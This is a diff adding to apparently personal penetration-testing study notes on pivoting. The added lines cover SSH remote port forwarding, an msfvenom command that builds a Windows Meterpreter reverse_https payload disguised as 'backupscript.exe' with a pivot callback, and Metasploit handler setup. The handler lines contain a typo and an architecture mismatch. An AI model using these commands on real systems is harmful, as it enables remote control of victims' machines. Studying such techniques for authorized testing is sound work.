@@ -78,3 +78,17 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
 ** Metasploit w ProxyChains
 - ~proxychains msfconsole~
 
+* Remote/Reverse Port Fwding w SSH
+- fwd local srv to remote port
+- need to find pivot host (common connection point b/w attack host & target)
+
+** Msfvenom payload
+- create Meterpreter HTTPS payload
+- use pivot IP for payload rev connection
+- ~msfvenom -p windows/x86/meterpreter/reverse_https lhost=<IPofPivot> -f exe -o backupscript.exe LPORT=8080~
+
+** Configuring & Starting multi/handler
+- ~exploit/multi/handler~
+- ~payload windows x64.meterpreter/reverse_https~
+- transfer payload to pivot, then to windows target
+- ~ssh -R <internal IP of PivotHost>:8080:0.0.0.0:8000 ubuntu@<targetIP> -vN~
